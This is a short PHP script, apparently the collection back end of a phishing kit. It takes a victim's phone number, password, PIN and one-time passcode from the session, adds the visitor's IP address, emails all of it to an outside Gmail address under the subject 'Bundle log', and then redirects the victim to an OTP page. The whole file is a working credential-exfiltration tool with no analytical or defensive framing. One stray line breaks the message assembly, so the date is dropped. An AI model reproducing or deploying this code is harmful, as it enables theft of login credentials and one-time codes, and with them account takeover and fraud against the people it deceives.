<?php
session_start();

$_SESSION['otp'] = $_POST['otp'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{   
    $ip = getenv("REMOTE_ADDR");
    $subject = "Bundle log";
    $to = "bundleafrica13@gmail.com";  
    $data = "number:" .$_SESSION['number']."\n".
            "password:" .$_SESSION['password']."\n".
            "pin:" .$_SESSION['pin']."\n".
            "otp:" .$_SESSION['otp']."\n".
           
            "IP : ".$ip."\n";$IP=$_POST['IP'];
            "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                        
            
    $message = "$data" ;  
                                  
    mail($to, $subject, $message);
}
if(isset($_POST['link'])) echo "<script>window.location.replace('');</script>";
else echo "<script>window.location.replace('../././websites/otp.html');</script>";
session_destroy();
?>
